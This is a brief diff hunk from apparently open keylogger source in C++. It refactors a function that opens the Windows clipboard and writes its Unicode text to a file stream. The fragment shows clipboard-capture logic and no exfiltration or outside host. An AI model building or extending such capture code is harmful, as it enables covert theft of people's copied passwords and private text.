@@ -38,9 +38,7 @@ void keylogger::write_clipboard_data(std::wofstream& stream)
 {
     if (OpenClipboard(nullptr))
     {
-        auto handle = GetClipboardData(CF_UNICODETEXT);
-
-        if (handle != nullptr)
+        if (auto handle = GetClipboardData(CF_UNICODETEXT))
         {
             stream << static_cast<WCHAR*>(GlobalLock(handle));
 
